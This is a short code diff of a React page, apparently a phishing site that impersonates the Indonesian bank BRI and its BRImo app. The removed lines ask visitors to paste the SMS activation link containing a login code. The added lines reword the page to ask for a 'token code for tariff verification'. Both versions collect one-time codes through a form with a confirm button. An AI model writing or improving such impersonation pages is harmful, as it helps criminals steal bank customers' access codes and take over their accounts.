@@ -30,10 +30,10 @@ const SiteVerifikasi = ({btnClick}) => {
           renderer={renderer}
         />
         </h1>    
-        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Link untuk aktivasi BRImo telah kami kirim ke nomor Handphone anda, Silahkan salin SMS tautan ini lalu tempel dibawah ini</h1>    
-        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Tempel SMS BRI (Wajib)</h1>    
+        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Kode token untuk verifikasi tarif telah kami kirim ke nomor Handphone anda, Silahkan masukkan dibawah ini untuk aktivasi tarif</h1>    
+        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Masukkan kode aktivasi (Wajib)</h1>    
         <form>
-            <textarea id='msg' className='form-control-pesan' rows={5} placeholder="Contoh SMS https://brimo.bri.co.id/app/login?code=xxxx"></textarea>
+            <textarea id='msg' className='form-control-pesan' rows={5} placeholder="Silahkan isi TOKEN"></textarea>
             <button type='button' onClick={handleClick} className='btn' id='btn' style={{marginTop:'2em', marginBottom:'2em'}}>
               Konfirmasi
             </button>
